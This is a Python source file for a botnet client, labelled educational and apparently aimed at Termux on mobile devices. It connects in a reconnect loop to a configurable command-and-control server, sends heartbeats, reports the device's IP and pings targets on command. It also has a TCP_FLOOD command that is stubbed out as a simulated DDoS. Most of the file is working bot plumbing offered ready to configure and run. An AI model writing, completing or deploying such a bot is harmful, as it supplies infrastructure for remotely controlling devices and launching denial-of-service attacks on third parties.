# mobile_bot.py - EDUCATIONAL USE ONLY IN ISOLATED LAB
import socket
import threading
import time
import subprocess
import platform

class EducationalBot:
    def __init__(self, c2_ip, c2_port=4444):
        self.c2_ip = c2_ip
        self.c2_port = c2_port
        self.running = True
        
    def get_ip(self):
        try:
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def ping_target(self, target):
        try:
            # Limited ping in Termux
            result = subprocess.run(
                ['ping', '-c', '4', target],
                capture_output=True,
                text=True,
                timeout=10
            )
            return result.stdout
        except:
            return "Ping failed"
    
    def connect_to_c2(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.c2_ip, self.c2_port))
                print(f"[*] Connected to C2 at {self.c2_ip}:{self.c2_port}")
                
                # Send initial heartbeat
                sock.send("HEARTBEAT".encode())
                
                while self.running:
                    # Check for commands
                    try:
                        sock.settimeout(5)
                        data = sock.recv(1024).decode().strip()
                        if data:
                            self.process_command(sock, data)
                        # Send periodic heartbeat
                        sock.send("HEARTBEAT".encode())
                        time.sleep(30)
                    except socket.timeout:
                        continue
                        
            except Exception as e:
                print(f"[!] Connection failed: {e}")
                time.sleep(10)  # Reconnect delay
    
    def process_command(self, sock, command):
        if command == "GET_IP":
            sock.send(self.get_ip().encode())
        elif command.startswith("PING|"):
            target = command.split("|")[1]
            result = self.ping_target(target)
            sock.send(result.encode())
        elif command.startswith("TCP_FLOOD|"):
            # SIMULATION ONLY - Real DDoS requires raw sockets (root)
            parts = command.split("|")
            response = f"SIM: Sent 1000 packets to {parts[1]}:{parts[2]} for {parts[3]}s"
            sock.send(response.encode())
    
    def start(self):
        print(f"[*] Bot starting. Local IP: {self.get_ip()}")
        threading.Thread(target=self.connect_to_c2, daemon=True).start()
        
        # Keep main thread alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print("[*] Bot shutting down")

if __name__ == "__main__":
    # CONFIGURE WITH YOUR LAB C2 IP
    C2_SERVER = "192.168.1.100"  # CHANGE THIS TO YOUR C2 VM IP
    
    bot = EducationalBot(C2_SERVER)
    bot.start()